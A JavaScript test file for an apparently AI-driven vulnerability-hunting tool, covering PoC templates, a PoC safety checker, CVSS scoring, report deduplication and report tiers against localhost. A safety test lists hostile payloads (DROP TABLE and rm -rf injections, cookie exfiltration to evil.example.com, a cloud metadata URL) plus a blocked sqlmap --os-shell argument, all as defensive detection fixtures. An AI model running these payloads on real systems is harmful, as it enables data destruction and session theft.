/**
 * Tests for Worker 5 (proof-report) scope:
 *  D19 PoC templates for every vuln class + reproducible snippets
 *  D20 PoC-safety guardrails + policyValidator
 *  D21 visual proof (headless Chromium captures a REAL alert screenshot)
 *  D22 reproducible PoC per finding
 *  E23 real PDF from real hunt data (parsed back, not "file exists")
 *  E24 CVSS auto-scoring on every finding
 *  E25 report dedup (normalize + hash lookup)
 *  E26 executive vs technical report tiers
 *  I49 OWASP Top-10 coverage meter
 *  I50 learning engine persistence + planner hookup
 */
import { describe, it, before, after } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { spawn } from 'node:child_process';
import { readFileSync, writeFileSync } from 'node:fs';

import {
  EXPLOIT_TEMPLATES,
  generatePoc,
  generateSafePoc,
  generateRepro,
  checkPocSafety,
  listPocTemplates
} from '../src/agent/exploitEngine.js';
import { PolicyValidator } from '../src/tools/policyValidator.js';
import { ToolRegistry } from '../src/tools/registry.js';
import { captureHeadlessProof, isUsableProof } from '../src/agent/visualProof.js';
import { buildReportPdf, verifyReportPdf, jpegDimensions } from '../src/services/pdfReportWriter.js';
import { applyCvss, applyCvssToAll, cvssBaseScore } from '../src/agent/cvss.js';
import { fingerprintTarget, canonicalTargetUrl } from '../src/services/targetFingerprint.js';
import { HuntRecordModel } from '../src/models/huntRecordModel.js';
import { renderExecutiveReport, renderTechnicalReport } from '../src/services/vulnerabilityReportBuilder.js';
import { owaspCoverage, owaspCategoryFor, OWASP_TOP10_2021 } from '../src/agent/methodology.js';
import { LearningEngine } from '../src/agent/learningEngine.js';
import { Planner } from '../src/agent/planner.js';
import { createHuntRecordController } from '../src/controllers/huntRecordController.js';
import { createJobController } from '../src/controllers/jobController.js';
import { FindingLifecycleService } from '../src/services/findingLifecycleService.js';

// ── PoC download endpoint (ReportReader "PoC" buttons) ────────────────────

function mockRes() {
  const res = { headers: {}, statusCode: 200, body: null };
  res.status = (code) => { res.statusCode = code; return res; };
  res.setHeader = (k, v) => { res.headers[k] = v; return res; };
  res.json = (obj) => { res.body = obj; return res; };
  res.send = (body) => { res.body = body; return res; };
  return res;
}

describe('PoC download endpoint', () => {
  it('serves a safety-checked PoC for an archived finding', async () => {
    const db = makeFakeDb();
    const model = new HuntRecordModel(db);
    const { hash, canonical } = fingerprintTarget('http://127.0.0.1:4567/');
    const saved = await model.create({
      userId: 'u1', target: 'http://127.0.0.1:4567/', targetCanonical: canonical, targetHash: hash,
      reportMarkdown: '# r',
      findings: [{ id: 'f1', type: 'xss_reflected', title: 'XSS', url: 'http://127.0.0.1:4567/search', parameter: 'q', confidence: 'confirmed' }]
    });
    const controller = createHuntRecordController({ huntRecordModel: model });
    const res = mockRes();
    await controller.downloadPoc(
      { user: { id: 'u1' }, params: { id: saved.id, findingId: 'f1' }, query: {} },
      res
    );
    assert.equal(res.statusCode, 200);
    assert.equal(res.headers['X-PoC-Safety'], 'checked-proof-only');
    assert.ok(String(res.body).includes('alert('), 'PoC body must contain the proof code');
    assert.ok(/attachment; filename="poc-f1\.(html|txt)"/.test(res.headers['Content-Disposition']));
  });

  it('serves reproducible curl/python snippets via ?kind=repro', async () => {
    const db = makeFakeDb();
    const model = new HuntRecordModel(db);
    const { hash, canonical } = fingerprintTarget('http://127.0.0.1:4567/');
    const saved = await model.create({
      userId: 'u1', target: 'x', targetCanonical: canonical, targetHash: hash, reportMarkdown: '# r',
      findings: [{ id: 'f2', type: 'sqli', url: 'http://127.0.0.1:4567/user', parameter: 'id', confidence: 'confirmed' }]
    });
    const controller = createHuntRecordController({ huntRecordModel: model });
    const res = mockRes();
    await controller.downloadPoc(
      { user: { id: 'u1' }, params: { id: saved.id, findingId: 'f2' }, query: { kind: 'repro', format: 'python' } },
      res
    );
    assert.equal(res.statusCode, 200);
    assert.ok(String(res.body).includes('urllib.request'));
  });

  it('404s for unknown findings and blocks unsafe PoCs', async () => {
    const db = makeFakeDb();
    const model = new HuntRecordModel(db);
    const { hash, canonical } = fingerprintTarget('http://127.0.0.1:4567/');
    const saved = await model.create({
      userId: 'u1', target: 'x', targetCanonical: canonical, targetHash: hash, reportMarkdown: '# r',
      findings: [{ id: 'f3', type: 'mystery_type_xyz', confidence: 'confirmed' }]
    });
    const controller = createHuntRecordController({ huntRecordModel: model });
    const res404 = mockRes();
    await controller.downloadPoc({ user: { id: 'u1' }, params: { id: saved.id, findingId: 'nope' }, query: {} }, res404);
    assert.equal(res404.statusCode, 404);
    const resNoTemplate = mockRes();
    await controller.downloadPoc({ user: { id: 'u1' }, params: { id: saved.id, findingId: 'f3' }, query: {} }, resNoTemplate);
    assert.equal(resNoTemplate.statusCode, 404);
    assert.equal(resNoTemplate.body.error.code, 'NO_POC_TEMPLATE');
  });
});

// ── D19: PoC templates for every vuln class ──────────────────────────────

const REQUIRED_CLASSES = [
  'xss_reflected', 'xss_stored', 'xss_dom', 'sqli', 'ssrf', 'idor',
  'lfi', 'command_injection', 'csrf', 'open_redirect', 'xxe', 'ssti'
];

describe('D19 PoC templates', () => {
  it('covers every required vuln class with a template', () => {
    const covered = new Set();
    for (const t of EXPLOIT_TEMPLATES) for (const v of t.vulnTypes) covered.add(v);
    for (const cls of REQUIRED_CLASSES) {
      const hit = [...covered].some((v) => v === cls || v.includes(cls) || cls.includes(v));
      assert.ok(hit, `no template covers ${cls}`);
    }
  });

  it('every template generates non-empty proof-only code for its class', () => {
    for (const cls of REQUIRED_CLASSES) {
      const finding = {
        type: cls,
        title: `Test ${cls}`,
        url: 'http://127.0.0.1:4567/search',
        parameter: 'q',
        evidence: '<script>alert(1)</script>',
        confidence: 'confirmed'
      };
      const poc = generatePoc(finding);
      assert.ok(poc, `generatePoc returned null for ${cls}`);
      assert.ok(poc.code && poc.code.length > 100, `empty PoC for ${cls}`);
      assert.ok(poc.name && poc.language, `missing metadata for ${cls}`);
    }
  });

  it('template validate() accepts confirmed findings', () => {
    const finding = { type: 'xss_reflected', confidence: 'confirmed', evidence: '<script' };
    const t = EXPLOIT_TEMPLATES.find((x) => x.vulnTypes.includes('xss_reflected'));
    assert.equal(t.validate(finding), true);
  });

  it('lists templates for the brain', () => {
    const list = listPocTemplates();
    assert.ok(list.length >= REQUIRED_CLASSES.length);
    assert.ok(list.every((t) => t.name && t.language && t.vulnTypes.length));
  });
});

// ── D20: PoC-safety guardrails ────────────────────────────────────────────

describe('D20 PoC safety guardrails', () => {
  it('ALL generated PoCs pass the safety check (no destructive payloads)', () => {
    const violations = [];
    for (const cls of REQUIRED_CLASSES) {
      const finding = {
        type: cls,
        title: `Test ${cls}`,
        url: 'http://127.0.0.1:4567/search',
        parameter: 'q',
        evidence: 'confirmed',
        confidence: 'confirmed'
      };
      const poc = generatePoc(finding);
      const check = checkPocSafety(poc.code);
      if (!check.safe) violations.push(`${poc.name}: ${check.violations.join(', ')}`);
    }
    assert.deepEqual(violations, [], `destructive patterns in templates: ${violations.join(' | ')}`);
  });

  it('checkPocSafety catches destructive payloads', () => {
    const bad = [
      "'; DROP TABLE users; --",
      "'; DELETE FROM accounts WHERE '1'='1",
      '"; rm -rf / #',
      '<script>new Image().src="https://evil.example.com/?c="+document.cookie</script>',
      'fetch("https://evil.example.com/exfil",{method:"POST",body:document.cookie})',
      'xxe with http://169.254.169.254/latest/meta-data/'
    ];
    for (const code of bad) {
      const check = checkPocSafety(code);
      assert.equal(check.safe, false, `missed destructive pattern in: ${code.slice(0, 40)}`);
      assert.ok(check.violations.length > 0);
    }
  });

  it('checkPocSafety passes benign proof code', () => {
    const good = `<script>alert('XSS confirmed at ' + document.domain);</script>`;
    assert.equal(checkPocSafety(good).safe, true);
  });

  it('generateSafePoc throws instead of emitting dangerous code', () => {
    const finding = { type: 'xss_reflected', confidence: 'confirmed' };
    const poc = generateSafePoc(finding);
    assert.equal(poc.safetyChecked, true);
  });

  it('a DESTRUCTIVE template is rejected: generateSafePoc throws, PoC endpoint 422s', async () => {
    // Tamper one real template to emit a destructive payload (simulates a
    // badly edited template or a compromised brain suggestion). The guardrail
    // must fail LOUD — never serve the code.
    const tpl = EXPLOIT_TEMPLATES.find((t) => t.vulnTypes.some((v) => String(v).includes('sqli')));
    assert.ok(tpl, 'need a sqli template to tamper');
    const original = tpl.generate;
    tpl.generate = () => "'; DROP TABLE users; --";
    try {
      const finding = { id: 'f-evil', type: 'sqli', url: 'http://127.0.0.1:4568/user', parameter: 'id', confidence: 'confirmed' };
      assert.throws(
        () => generateSafePoc(finding),
        /PoC safety guardrail tripped/,
        'destructive template must throw, never emit'
      );

      // The download endpoint must surface this as 422, not serve the payload.
      const db = makeFakeDb();
      const model = new HuntRecordModel(db);
      const { hash, canonical } = fingerprintTarget('http://127.0.0.1:4568/');
      const saved = await model.create({
        userId: 'u1', target: 'http://127.0.0.1:4568/', targetCanonical: canonical, targetHash: hash,
        reportMarkdown: '# r', findings: [finding]
      });
      const controller = createHuntRecordController({ huntRecordModel: model });
      const res = mockRes();
      await controller.downloadPoc({ user: { id: 'u1' }, params: { id: saved.id, findingId: 'f-evil' }, query: {} }, res);
      assert.equal(res.statusCode, 422, 'unsafe PoC must be blocked with 422');
      assert.equal(res.body.error.code, 'POC_SAFETY_BLOCKED');
      assert.ok(!String(res.body.error.message || '').includes('DROP TABLE'), 'the payload itself must never leak into the error');
    } finally {
      tpl.generate = original; // restore — other tests use the real template
    }
  });

  it('policyValidator blocks destructive tool arguments', () => {
    const sqlmap = ToolRegistry.get('sqlmap');
    assert.ok(sqlmap, 'sqlmap must be in the registry for this test');
    const scope = { validateToolTarget: () => ({ valid: true }) };
    const risky = PolicyValidator.validate(
      { tool: 'sqlmap', target: 'http://127.0.0.1:4567/', arguments: { extra: '--risk=3 --level=5' } },
      scope
    );
    assert.equal(risky.allowed, false, 'risk 3 / level 5 must be blocked');
    const shell = PolicyValidator.validate(
      { tool: 'sqlmap', target: 'http://127.0.0.1:4567/', arguments: { extra: '--os-shell' } },
      scope
    );
    assert.equal(shell.allowed, false, '--os-shell must be blocked');
  });
});

// ── D22: reproducible PoC per finding ─────────────────────────────────────

describe('D22 reproducible snippets', () => {
  it('generateRepro returns curl + python for a finding', () => {
    const finding = {
      type: 'xss_reflected',
      url: 'http://127.0.0.1:4567/search',
      parameter: 'q',
      proofToken: 'DM-POC-TOKEN'
    };
    const repro = generateRepro(finding);
    assert.ok(repro);
    assert.ok(repro.curl.includes('http://127.0.0.1:4567/search'), 'curl must target the finding URL');
    assert.ok(repro.curl.includes('DM-POC-TOKEN'), 'curl must carry the proof token');
    assert.ok(repro.python.includes('urllib.request'), 'python must use stdlib only');
    assert.ok(repro.python.includes('DM-POC-TOKEN'));
    // read-only: no writes, no deletes, no exfil
    assert.equal(checkPocSafety(repro.curl).safe, true);
    assert.equal(checkPocSafety(repro.python).safe, true);
  });

  it('generateRepro returns null without a URL', () => {
    assert.equal(generateRepro({ type: 'xss' }), null);
  });
});

// ── E24: CVSS auto-scoring ────────────────────────────────────────────────

describe('E24 CVSS auto-scoring', () => {
  it('every vuln class gets a deterministic vector + score', () => {
    for (const cls of REQUIRED_CLASSES) {
      const cvss = applyCvss({ type: cls, severity: 'high' });
      assert.ok(typeof cvss.score === 'number', `no score for ${cls}`);
      assert.ok(cvss.score >= 0 && cvss.score <= 10, `score out of range for ${cls}`);
      assert.ok(/^CVSS:3\.1\//.test(cvss.vector), `bad vector for ${cls}: ${cvss.vector}`);
      assert.ok(['None', 'Low', 'Medium', 'High', 'Critical'].includes(cvss.rating));
      assert.equal(cvss.source, 'default');
    }
  });

  it('brain-supplied metrics take priority', () => {
    const cvss = applyCvss({
      type: 'xss_reflected',
      cvssMetrics: { vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H' }
    });
    assert.equal(cvss.source, 'brain');
    assert.ok(cvss.score >= 9, `expected critical score, got ${cvss.score}`);
    assert.equal(cvss.rating, 'Critical');
  });

  it('unknown types fall back to the severity rating, honestly labeled', () => {
    const cvss = applyCvss({ type: 'something_brand_new', severity: 'medium' });
    assert.equal(cvss.source, 'severity');
    assert.equal(cvss.score, null);
    assert.equal(cvss.rating, 'Medium');
  });

  it('applyCvssToAll enriches a whole finding list', () => {
    const out = applyCvssToAll([
      { id: 'f1', type: 'sqli', severity: 'critical' },
      { id: 'f2', type: 'open_redirect', severity: 'low' }
    ]);
    assert.ok(out.every((f) => f.cvss && typeof f.cvss.score === 'number'));
    assert.ok(out[0].cvss.score > out[1].cvss.score, 'sqli should outrank open redirect');
  });

  it('known CVSS example scores correctly (CVE-style sanity)', () => {
    // CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N is the canonical 6.1 example
    const { score } = cvssBaseScore({ vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N' });
    assert.equal(score, 6.1);
  });

  it('scores are computed in the REAL finding pipeline (createFinding), not hardcoded', async () => {
    // The finding pipeline is FindingLifecycleService.createFinding — every
    // persisted finding must carry a computed cvss object.
    const rows = [];
    const findingModel = {
      async create(assessmentId, userId, input) {
        const row = { id: 'find_x', assessmentId, userId, ...input };
        rows.push(row);
        return row;
      },
      async update() { return null; },
      async list() { return []; }
    };
    const evidenceModel = {
      async get(id) { return { id, toolExecutionId: 'exec_1' }; },
      async linkToFinding() { return null; }
    };
    const svc = new FindingLifecycleService({
      findingModel,
      evidenceModel,
      memory: { rememberFinding: async () => null },
      eventService: null,
      agentStateModel: null
    });

    // 1. Brain-supplied metrics → real math, not a constant.
    const brain = await svc.createFinding({
      userId: 'u1', assessmentId: 'a1', jobId: null,
      title: 'SQLi', severity: 'critical', category: 'sqli',
      endpoint: '/user', parameter: 'id',
      evidenceIds: ['ev1'],
      cvssMetrics: { vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H' }
    });
    assert.equal(brain.created, true);
    assert.equal(brain.finding.cvss.source, 'brain');
    assert.equal(brain.finding.cvss.score, 9.8, `brain metrics must compute to 9.8, got ${brain.finding.cvss.score}`);
    assert.equal(brain.finding.cvss.rating, 'Critical');
    assert.ok(/^CVSS:3\.1\//.test(brain.finding.cvss.vector));
    assert.ok(brain.finding.cvssMetrics, 'brain metrics must be persisted with the finding');

    // 2. Type defaults (brain said nothing) → deterministic vector+score.
    const def = await svc.createFinding({
      userId: 'u1', assessmentId: 'a1', jobId: null,
      title: 'XSS', severity: 'high', category: 'xss_reflected',
      endpoint: '/search', parameter: 'q',
      evidenceIds: ['ev2']
    });
    assert.equal(def.finding.cvss.source, 'default');
    assert.equal(typeof def.finding.cvss.score, 'number');
    assert.ok(/^CVSS:3\.1\//.test(def.finding.cvss.vector));

    // 3. Unknown class → severity rating, honestly labeled score-less.
    const sev = await svc.createFinding({
      userId: 'u1', assessmentId: 'a1', jobId: null,
      title: 'Weird', severity: 'medium', category: 'uncategorized',
      endpoint: '/odd', evidenceIds: ['ev3']
    });
    assert.equal(sev.finding.cvss.source, 'severity');
    assert.equal(sev.finding.cvss.score, null);
    assert.equal(sev.finding.cvss.rating, 'Medium');

    // 4. The persisted rows really carry cvss (the model's create stored it).
    assert.ok(rows.every((r) => r.cvss && r.cvss.rating), 'cvss must be persisted on every finding row');
  });
});

// ── E25: dedup (normalize + hash lookup) ──────────────────────────────────

function makeFakeDb() {
  const store = new Map(); // collection name -> array
  const coll = (name) => {
    if (!store.has(name)) store.set(name, []);
    const docs = store.get(name);
    const matches = (doc, filter) =>
      Object.entries(filter || {}).every(([k, v]) => doc[k] === v);
    return {
      async insertOne(doc) { docs.push({ ...doc }); return { insertedId: doc.id }; },
      find(filter = {}) {
        const rows = docs.filter((d) => matches(d, filter));
        const cursor = {
          sort(spec) {
            const [key] = Object.keys(spec);
            const dir = spec[key];
            rows.sort((a, b) => (a[key] < b[key] ? -dir : a[key] > b[key] ? dir : 0));
            return cursor;
          },
          limit(n) { return { async toArray() { return rows.slice(0, n); } }; },
          async toArray() { return rows; }
        };
        return cursor;
      },
      async findOne(filter = {}) { return docs.find((d) => matches(d, filter)) || null; },
      async countDocuments(filter = {}) { return docs.filter((d) => matches(d, filter)).length; }
    };
  };
  return { collection: coll };
}

describe('E25 report dedup', () => {
  it('normalizes equivalent target URLs to the same hash', () => {
    const a = fingerprintTarget('http://127.0.0.1:4567/search/?q=1&utm_source=x');
    const b = fingerprintTarget('http://127.0.0.1:4567/search?q=1');
    const c = fingerprintTarget('http://127.0.0.1:4567/search?id=1&q=1');
    assert.equal(a.canonical, b.canonical, 'trailing slash + tracking param must not change identity');
    assert.equal(a.hash, b.hash);
    assert.notEqual(a.hash, c.hash, 'different params must hash differently');
  });

  it('re-pasting the same target returns the existing report (hash lookup)', async () => {
    const db = makeFakeDb();
    const model = new HuntRecordModel(db);
    const { hash, canonical } = fingerprintTarget('http://127.0.0.1:4567/search?q=1&utm_campaign=x');
    const saved = await model.create({
      userId: 'u1', target: 'http://127.0.0.1:4567/search?q=1&utm_campaign=x',
      targetCanonical: canonical, targetHash: hash,
      reportMarkdown: '# saved report', summary: { totalFindings: 1 }
    });
    assert.equal(saved.version, 1);
    // Re-paste with different formatting → same hash → same record back
    const { hash: hash2 } = fingerprintTarget('http://127.0.0.1:4567/search/?q=1');
    const existing = await model.findLatestByTarget('u1', hash2);
    assert.ok(existing, 'dedup lookup must hit');
    assert.equal(existing.id, saved.id);
    const full = await model.findFullById('u1', existing.id);
    assert.equal(full.reportMarkdown, '# saved report', 'the SAVED pdf/markdown is returned, not a re-run');
  });

  it('"Start new hunt" (forceNew) creates a new version instead of deduping', async () => {
    const db = makeFakeDb();
    const model = new HuntRecordModel(db);
    const { hash, canonical } = fingerprintTarget('http://127.0.0.1:4567/');
    await model.create({ userId: 'u1', target: 'http://127.0.0.1:4567/', targetCanonical: canonical, targetHash: hash, reportMarkdown: 'v1' });
    const v2 = await model.create({ userId: 'u1', target: 'http://127.0.0.1:4567/', targetCanonical: canonical, targetHash: hash, reportMarkdown: 'v2' });
    assert.equal(v2.version, 2, 'forceNew must version, not overwrite');
    const latest = await model.findLatestByTarget('u1', hash);
    assert.equal(latest.version, 2);
  });

  it('dedup is per-user: another user does not see your report', async () => {
    const db = makeFakeDb();
    const model = new HuntRecordModel(db);
    const { hash, canonical } = fingerprintTarget('http://127.0.0.1:4567/');
    await model.create({ userId: 'u1', target: 'x', targetCanonical: canonical, targetHash: hash, reportMarkdown: 'u1 report' });
    const other = await model.findLatestByTarget('u2', hash);
    assert.equal(other, null);
  });
});

// ── E25b: dedup end-to-end through POST /jobs ───────────────────────────────

describe('E25b dedup end-to-end (job intake)', () => {
  function makeController(record) {
    const huntRecordModel = {
      async findLatestByTarget(userId, hash) {
        return record && record.userId === userId && record.targetHash === hash
          ? { id: record.id }
          : null;
      },
      async findFullById(userId, id) {
        return record && record.userId === userId && record.id === id ? record : null;
      }
    };
    const assessmentService = {
      async createFromTarget(userId, input) {
        return { status: 'assessment_created', assessmentId: 'a-new', assessment: { targetHostname: 'h', scope: {} } };
      }
    };
    const jobManager = {
      async createJob(input) {
        return { id: 'job-new', target: input.target, scope: input.scope, status: 'running', stepCount: 0 };
      }
    };
    return createJobController({ jobManager, assessmentService, eventService: null, huntRecordModel });
  }

  it('first submit runs the agent (202); re-paste of the same target returns the SAVED report (200 deduped)', async () => {
    const controller = makeController(null);
    const req = (body) => ({ user: { id: 'u1' }, body });

    const first = mockRes();
    await controller.create(req({ authorizationConfirmed: true, targetUrl: 'http://127.0.0.1:4568/search?q=1' }), first);
    assert.equal(first.statusCode, 202, 'first submit must start a hunt, not dedup');
    assert.ok(first.body.jobId, 'must return the new job id');

    // A completed hunt record now exists for that target (stored under its hash).
    const { hash, canonical } = fingerprintTarget('http://127.0.0.1:4568/search?q=1');
    const saved = {
      id: 'hr-1', userId: 'u1', targetHash: hash, targetCanonical: canonical,
      reportMarkdown: '# the saved report', version: 3
    };
    const controller2 = makeController(saved);

    // Re-paste with DIFFERENT formatting (trailing slash + tracking params) —
    // fingerprinting must still hit the same record, and the SAVED report comes back.
    const second = mockRes();
    await controller2.create(req({ authorizationConfirmed: true, targetUrl: 'http://127.0.0.1:4568/search/?q=1&utm_source=x' }), second);
    assert.equal(second.statusCode, 200);
    assert.equal(second.body.deduped, true, 're-paste must be deduped');
    assert.equal(second.body.huntRecord.id, 'hr-1');
    assert.equal(second.body.huntRecord.reportMarkdown, '# the saved report', 'the SAVED report is returned, not a re-run');
    assert.equal(second.body.target, canonical);
  });

  it('"Start new hunt" (forceNew) bypasses dedup and starts a fresh job', async () => {
    const { hash, canonical } = fingerprintTarget('http://127.0.0.1:4568/');
    const saved = { id: 'hr-1', userId: 'u1', targetHash: hash, targetCanonical: canonical, reportMarkdown: '# old', version: 1 };
    const controller = makeController(saved);
    const res = mockRes();
    await controller.create({ user: { id: 'u1' }, body: { authorizationConfirmed: true, targetUrl: 'http://127.0.0.1:4568/', forceNew: true } }, res);
    assert.equal(res.statusCode, 202, 'forceNew must start a new hunt');
    assert.ok(res.body.jobId);
    assert.equal(res.body.deduped, undefined);
  });

  it('a different target (different hash) does NOT dedup', async () => {
    const { hash, canonical } = fingerprintTarget('http://127.0.0.1:4568/other');
    const saved = { id: 'hr-1', userId: 'u1', targetHash: hash, targetCanonical: canonical, reportMarkdown: '# other', version: 1 };
    const controller = makeController(saved);
    const res = mockRes();
    await controller.create({ user: { id: 'u1' }, body: { authorizationConfirmed: true, targetUrl: 'http://127.0.0.1:4568/search?q=1' } }, res);
    assert.equal(res.statusCode, 202, 'different target must start a new hunt');
  });
});

// ── E26: executive vs technical tiers ─────────────────────────────────────

describe('E26 report tiers', () => {
  const findings = [{
    title: 'Reflected XSS in /search',
    severity: 'high',
    type: 'xss_reflected',
    cvss: { score: 6.1, rating: 'Medium', vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N' },
    affectedEndpoint: '/search',
    parameter: 'q',
    description: 'The q parameter is reflected without output encoding.',
    impact: 'An attacker can steal sessions via a malicious link.',
    reproductionSteps: ['GET /search?q=<script>alert(1)</script>'],
    repro: { curl: 'curl "http://127.0.0.1:4567/search?q=DM-POC-TOKEN"', python: 'print("x")' },
    poc: { name: 'Reflected XSS PoC', language: 'html' },
    remediation: ['Encode output.', 'Deploy CSP.'],
    evidence: [{ kind: 'screenshot', summary: 'alert fired', dialogFired: true }]
  }];
  const summary = { validated: 1, critical: 0, high: 1, medium: 0, low: 0, informational: 0 };

  it('executive tier: business risk, NO payloads or PoC material', () => {
    const md = renderExecutiveReport({ target: 'http://127.0.0.1:4567', summary, findings });
    assert.ok(md.includes('Executive Security Summary'));
    assert.ok(md.includes('HIGH'), 'must carry the business risk rating');
    assert.ok(!/<script/i.test(md), 'must not contain exploit payloads');
    assert.ok(!md.includes('curl '), 'must not contain reproduction commands');
    assert.ok(!/alert\(1\)/.test(md), 'must not contain PoC code');
    assert.ok(md.length < 6000, `executive tier should stay short, got ${md.length} chars`);
  });

  it('technical tier: evidence, repro, PoCs, remediation', () => {
    const md = renderTechnicalReport({ target: 'http://127.0.0.1:4567', summary, findings });
    assert.ok(md.includes('Technical Assessment Report'));
    assert.ok(md.includes('CVSS'), 'must show the CVSS line');
    assert.ok(md.includes('curl "http://127.0.0.1:4567/search?q=DM-POC-TOKEN"'), 'must include the repro curl');
    assert.ok(md.includes('Reproduction steps'));
    assert.ok(md.includes('Encode output.'), 'must include remediation');
    assert.ok(md.includes('alert fired'), 'must include evidence');
  });

  it('both tiers render from the SAME findings without inventing data', () => {
    const exec = renderExecutiveReport({ target: 't', summary, findings });
    const tech = renderTechnicalReport({ target: 't', summary, findings });
    for (const md of [exec, tech]) {
      assert.ok(md.includes('Reflected XSS in /search'));
      assert.ok(!md.includes('CVE-2099'), 'no invented identifiers');
    }
  });
});

// ── E26b: PDF tiers render from the SAME data ───────────────────────────────

describe('E26b PDF report tiers', () => {
  const reportData = {
    title: 'Assessment — fixture',
    target: 'http://127.0.0.1:4568',
    generatedAt: '2026-10-02T00:00:00.000Z',
    summary: { critical: 0, high: 1, medium: 0, low: 0, informational: 0, validated: 1 },
    executiveSummary: 'One high-severity issue was confirmed: reflected XSS on /search.',
    findings: [{
      title: 'Reflected XSS in /search (q parameter)',
      severity: 'high',
      cvss: { score: 6.1, rating: 'Medium', vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N' },
      affectedEndpoint: '/search',
      parameter: 'q',
      description: 'The q parameter is reflected without output encoding.',
      impact: 'Session theft via malicious link.',
      reproductionSteps: ['GET /search?q=<script>alert(1)</script>'],
      repro: { curl: 'curl "http://127.0.0.1:4568/search?q=DM-POC-TOKEN"' },
      remediation: ['Encode output.'],
      evidence: [{ kind: 'screenshot', summary: 'alert fired', dialogFired: true }]
    }]
  };

  it('technical PDF carries repro + evidence; executive PDF omits them (same findings)', () => {
    const tech = buildReportPdf({ ...reportData, mode: 'technical' });
    const exec = buildReportPdf({ ...reportData, mode: 'executive' });

    const vTech = verifyReportPdf(tech, ['Reflected XSS in /search', 'Reproduction steps', 'Evidence (1)', 'CVSS 6.1']);
    assert.ok(vTech.ok, `technical PDF incomplete: missing=${vTech.missing}`);
    assert.ok(vTech.pages >= 1);

    // Executive tier: business facts present, exploitation material absent.
    const vExec = verifyReportPdf(exec,
      ['Reflected XSS in /search', 'Executive summary'],
      { absent: ['Reproduction steps', 'Evidence (1)', 'DM-POC-TOKEN'] });
    assert.ok(vExec.ok, `executive tier wrong: missing=${vExec.missing} leaked=${vExec.leaked}`);

    // Same data: the finding title + CVSS line appear in BOTH.
    for (const v of [vTech, vExec]) {
      assert.ok(v.textLength > 500, 'each tier must carry real content');
    }
    assert.ok(exec.length < tech.length, `executive PDF (${exec.length}B) should be smaller than technical (${tech.length}B)`);
  });
});

// ── I49: OWASP coverage meter ─────────────────────────────────────────────

describe('I49 OWASP coverage meter', () => {
  it('maps vuln types to OWASP Top-10 categories', () => {
    assert.equal(owaspCategoryFor('xss_reflected').id, 'A03');
    assert.equal(owaspCategoryFor('sqli').id, 'A03');
    assert.equal(owaspCategoryFor('idor').id, 'A01');
    assert.equal(owaspCategoryFor('ssrf').id, 'A10');
  });

  it('computes per-hunt coverage percent across the Top-10', () => {
    const findings = [
      { type: 'xss_reflected', status: 'validated' },
      { type: 'sqli', status: 'validated' },
      { type: 'xss_stored', status: 'validated' },   // still A03
      { type: 'idor', status: 'validated' },
      { type: 'ssrf', status: 'potential' }          // NOT counted
    ];
    const cov = owaspCoverage(findings);
    assert.equal(cov.total, 10);
    assert.deepEqual(cov.covered.map((c) => c.id).sort(), ['A01', 'A03']);
    assert.equal(cov.percent, 20);
    assert.equal(cov.uncovered.length, 8);
  });

  it('ignores unvalidated findings', () => {
    const cov = owaspCoverage([{ type: 'sqli', status: 'potential' }]);
    assert.equal(cov.percent, 0);
    assert.equal(cov.covered.length, 0);
  });

  it('has exactly the 10 real OWASP 2021 categories', () => {
    const real = OWASP_TOP10_2021.filter((c) => c.id !== 'A00');
    assert.equal(real.length, 10);
    assert.ok(real.some((c) => c.id === 'A10' && /Request Forgery/.test(c.name)));
  });
});

// ── I50: learning engine + planner hookup ─────────────────────────────────

describe('I50 learning engine', () => {
  it('persists to disk and reloads (REAL persistence)', () => {
    const dir = mkdtempSync(join(tmpdir(), 'dm-learn-'));
    const e1 = new LearningEngine(dir);
    e1.recordTechnique('nodejs', 'xss_reflected::nuclei', true);
    e1.recordTechnique('nodejs', 'xss_reflected::nuclei', true);
    e1.recordTechnique('nodejs', 'sqli_boolean::sqlmap', false);
    e1.recordTechnique('nodejs', 'sqli_boolean::sqlmap', false);
    const e2 = LearningEngine.load(dir);
    const suggested = e2.suggestTechniques('nodejs', 5);
    assert.ok(suggested.includes('xss_reflected::nuclei'), 'past success must be suggested');
    assert.ok(!suggested.includes('sqli_boolean::sqlmap') || suggested.indexOf('xss_reflected::nuclei') < suggested.indexOf('sqli_boolean::sqlmap'),
      'higher success rate must rank first');
  });

  it('recordConfirmedFinding feeds the planner bias', () => {
    const engine = new LearningEngine(null);
    for (let i = 0; i < 3; i++) engine.recordConfirmedFinding({ techStack: 'php', technique: 'sqli_boolean', tool: 'sqlmap' });
    for (let i = 0; i < 2; i++) engine.recordTechnique('php', 'xss_probe::nuclei', false);
    const suggested = engine.suggestTechniques('php');
    assert.equal(suggested[0], 'sqli_boolean::sqlmap');
  });

  it('planner reads learning into the prompt and biases tool priority', () => {
    const engine = new LearningEngine(null);
    // nuclei succeeded twice on nodejs → deterministic planner should pick it first
    engine.recordTechnique('nodejs', 'vuln_scan::nuclei', true);
    engine.recordTechnique('nodejs', 'vuln_scan::nuclei', true);
    const planner = new Planner({ learningEngine: engine });
    const context = { target: 'http://127.0.0.1:4567', technologies: ['nodejs'], completedToolNames: [], failedToolNames: [] };
    const msg = planner.buildUserMessage(context, null);
    assert.ok(msg.includes('Learning from past hunts'), 'prompt must carry learning insights');
    assert.ok(msg.includes('nuclei'), 'insights must name the successful technique');
    const decision = planner.decideDeterministic(context);
    assert.equal(decision.selected_action.tool, 'nuclei', 'past success must bias the first tool choice');
  });

  it('planner works fine with no learning engine attached', () => {
    const planner = new Planner({});
    const context = { target: 't', technologies: [], completedToolNames: [], failedToolNames: [] };
    assert.equal(planner.learningSection(context), '');
    const decision = planner.decideDeterministic(context);
    assert.equal(decision.selected_action.tool, 'crtsh');
  });
});

// ── D21: visual proof — REAL headless screenshot ───────────────────────────

const FIXTURE_PORT = 4568;
const FIXTURE_URL = `http://127.0.0.1:${FIXTURE_PORT}`;
let fixtureProc = null;
const PROOF_SHOT_PATH = '/tmp/xss_alert_open.jpg';

